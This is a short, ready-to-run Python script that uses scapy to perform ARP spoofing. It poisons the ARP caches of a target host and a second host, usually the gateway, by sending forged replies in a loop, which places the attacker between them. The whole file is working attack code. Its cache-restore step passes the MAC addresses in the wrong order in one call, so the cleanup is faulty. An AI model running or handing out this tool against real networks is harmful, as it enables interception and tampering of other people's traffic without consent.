#!/usr/bin/env python3

from argparse import *
from scapy.all import *
from scapy.layers.l2 import ARP, Ether, arping
from termcolor import cprint


def get_arg():
    parser = ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Enter the target ip address")
    parser.add_argument("-s", "--spoof", dest="spoof", help="Enter the target ip address")
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()
    return parser.parse_args()


def arp_spoof(tar_ip, spoof_ip, mac):
    packets = ARP(op=2, pdst=tar_ip, hwdst=mac, psrc=spoof_ip)
    send(packets, verbose=False)


def get_mac(ip):
    ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), verbose=False)[0]
    return ans[0][1].hwsrc


def restore(tar_ip, spoof_ip, tar_mac, spoof_mac):
    packets = ARP(op=2, pdst=tar_ip, hwdst=tar_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packets, count=4, verbose=False)


def main():
    values = get_arg()
    tar_ip = values.target
    spoof_ip = values.spoof
    pac = 0
    tar_mac = get_mac(tar_ip)
    spoof_mac = get_mac(spoof_ip)
    try:
        while True:
            arp_spoof(tar_ip, spoof_ip, tar_mac)
            arp_spoof(spoof_ip, tar_ip, spoof_mac)
            pac += 2
            print("\r[+]Total Packets Sent = " + str(pac), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        cprint("\n[-] Script quits\nCause: Keyboard Interruption", "red")
        restore(tar_ip, spoof_ip, tar_mac, spoof_mac)
        restore(spoof_ip, tar_ip, tar_mac, spoof_mac)


main()
